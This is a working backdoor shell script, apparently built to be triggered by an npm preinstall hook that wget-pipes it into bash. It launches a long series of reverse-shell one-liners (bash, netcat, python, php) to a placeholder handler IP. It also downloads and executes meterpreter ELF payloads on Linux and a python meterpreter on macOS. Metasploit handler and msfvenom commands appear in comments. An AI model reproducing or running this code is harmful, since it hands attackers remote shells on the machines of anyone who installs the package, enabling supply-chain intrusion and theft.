#loaded with "preinstall": "wget -q -O - http://WEBSERVER_IP:WEBSERVER_PORT/all_the_backdoors.sh | bash"
unameOut="$(uname -s)"
case "${unameOut}" in
    Linux*)     machine=Linux;;
    Darwin*)    machine=Mac;;
    *)          machine="UNKNOWN:${unameOut}"
esac

# Getto shells
# Going to port 4242
# use exploit/multi/handler
# set payload linux/x86/shell/reverse_tcp
# set lport 4242
# set lhost 0.0.0.0
# run -j -z --> but it is better to run it 1-by-1
bash -i >& /dev/tcp/HANDLER_IP/4242 0>&1 
ncat -e /bin/sh HANDLER_IP 4242 
nc -c bash HANDLER_IP 4242 
netcat HANDLER_IP 4242 -e /bin/bash 
#netcat --udp HANDLER_IP 4242 -e /bin/bash &
#bash -i >& /dev/udp/HANDLER_IP/4242 &
export RHOST="HANDLER_IP";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' 
#awk 'BEGIN {s = "/inet/tcp/0/HANDLER_IP/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null &
python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("HANDLER_IP",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' 
python -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("HANDLER_IP",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")' 
python -c 'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("HANDLER_IP",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])' 
python -c 'a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("HANDLER_IP",4242));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())' 
python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("HANDLER_IP",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")' 
python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("HANDLER_IP",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")' 
python -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("HANDLER_IP",4242));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())' 
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' 
python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' 
python -c 'a=__import__;c=a("socket");o=a("os").dup2;p=a("pty").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")' 
php -r '$sock=fsockopen("HANDLER_IP",4242);exec("/bin/sh -i <&3 >&3 2>&3");' 
php -r '$sock=fsockopen("HANDLER_IP",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");' 
php -r '$sock=fsockopen("HANDLER_IP",4242);`/bin/sh -i <&3 >&3 2>&3`;' 
php -r '$sock=fsockopen("HANDLER_IP",4242);system("/bin/sh -i <&3 >&3 2>&3");' 
php -r '$sock=fsockopen("HANDLER_IP",4242);passthru("/bin/sh -i <&3 >&3 2>&3");' 
php -r '$sock=fsockopen("HANDLER_IP",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");' 


# ubuntu
if [ "$machine" == "Linux" ]; then
    # unstaged going to port 4343  
    # webserver at WEBSERVER_IP:WEBSERVER_PORT
    # use exploit/multi/handler
    # set payload linux/x64/meterpreter_reverse_tcp
    # set lport 4343
    # set lhost 0.0.0.0
    # run -j -z
    # msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=HANDLER_IP LPORT=4343 -e x86/shikata_ga_nai -i 19 -f elf > m_shi_iter.elf
    # msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=HANDLER_IP LPORT=4343 -e x86/shikata_ga_nai -f elf > m_shi.elf
    # msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=HANDLER_IP LPORT=4343 -f elf > m.elf
    wget http://WEBSERVER_IP:WEBSERVER_PORT/linux/m_shi_iter.elf -O m_shi_iter.elf && chmod +x ./m_shi_iter.elf && ./m_shi_iter.elf & rm ./m_shi_iter.elf
    wget http://WEBSERVER_IP:WEBSERVER_PORT/linux/m_shi.elf -O m_shi.elf && chmod +x ./m_shi.elf && ./m_shi.elf & rm ./m_shi.elf
    wget http://WEBSERVER_IP:WEBSERVER_PORT/linux/m.elf -O m.elf && chmod +x ./m.elf && ./m.elf & rm ./m.elf
    # This one is for reflective loading on linux with https://github.com/rek7/fireELF but I'm not automating this for now so you hafta create the payload and uncomment the line
    # python -c "import urllib2;exec(urllib2.urlopen('http://WEBSERVER_IP:WEBSERVER_PORT/linux/metr_loaded.py').read())" &

    # staged going to port 4444  
    # webserver at WEBSERVER_IP:WEBSERVER_PORT
    # use exploit/multi/handler
    # set payload linux/x64/meterpreter/reverse_tcp
    # set lport 4444
    # set lhost 0.0.0.0
    # run -j -z
    # msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=HANDLER_IP LPORT=4444 -e x86/shikata_ga_nai -i 19 -f elf > m_staged_shi_iter.elf
    # msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=HANDLER_IP LPORT=4444 -e x86/shikata_ga_nai -f elf > m_staged_shi.elf
    # msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=HANDLER_IP LPORT=4444 -f elf > m_staged.elf
    wget http://HANDLER_IP:WEBSERVER_PORT/linux/m_staged_shi_iter.elf -O m_staged_shi_iter.elf && chmod +x ./m_staged_shi_iter.elf && ./m_staged_shi_iter.elf & rm ./m_staged_shi_iter.elf
    wget http://HANDLER_IP:WEBSERVER_PORT/linux/m_staged_shi.elf -O m_staged_shi.elf && chmod +x ./m_staged_shi.elf && ./m_staged_shi.elf & rm ./m_staged_shi.elf
    wget http://HANDLER_IP:WEBSERVER_PORT/linux/m_staged.elf -O m_staged.elf && chmod +x ./m_staged.elf && ./m_staged.elf & rm ./m_staged.elf
    
    # This one is for reflective loading on linux with https://github.com/rek7/fireELF but I'm not automating this for now so you hafta create the payload and uncomment the line
    # python -c "import urllib2;exec(urllib2.urlopen('http://HANDLER_IP:WEBSERVER_PORT/linux/metr_staged_loaded.py').read())" &

    # Mythic
    # it is a bit more complicated but worth playing around, you have to generate to implants yourself https://github.com/its-a-feature/Mythic
    #wget http://WEBSERVER_IP:WEBSERVER_PORT/linux/merlin.elf  -O merlin.elf  && chmod +x ./merlin.elf  && ./merlin.elf  & rm ./merlin.elf 
    #wget http://WEBSERVER_IP:WEBSERVER_PORT/linux/merlin_obfuscated.elf -O merlin_obfuscated.elf  && chmod +x ./merlin_obfuscated.elf  && ./merlin_obfuscated.elf  & rm ./merlin_obfuscated.elf
    #python2 -c "import urllib2;exec(urllib2.urlopen('http://WEBSERVER_IP:WEBSERVER_PORT/linux/medusa_linux.py').read())" &
    #python2 -c "import urllib2;exec(urllib2.urlopen('http://WEBSERVER_IP:WEBSERVER_PORT/linux/medusa_linux_obfuscated.py').read())" &
fi

# osx
if [ "$machine" == "Mac" ]; then
    # meterpreter
    # use exploit/multi/handler
    # set payload python/meterpreter/reverse_tcp
    # set lport 4545
    # set lhost 0.0.0.0
    # run -j -z 
    curl -s http://WEBSERVER_IP:WEBSERVER_PORT/macos/py_meter.py  | python2 

    # Mythic
    # it is a bit more complicated but worth playing around, you have to generate to implants yourself https://github.com/its-a-feature/Mythic
    # apfell
    #curl http://WEBSERVER_IP:WEBSERVER_PORT/macos/apfell_final.js | osascript -l JavaScript &    
    # Medusa
    #python2 -c "import urllib2;exec(urllib2.urlopen('http://WEBSERVER_IP:WEBSERVER_PORT/linux/medusa_linux.py').read())" &
    #python2 -c "import urllib2;exec(urllib2.urlopen('http://WEBSERVER_IP:WEBSERVER_PORT/linux/medusa_linux_obfuscated.py').read())" &
fi
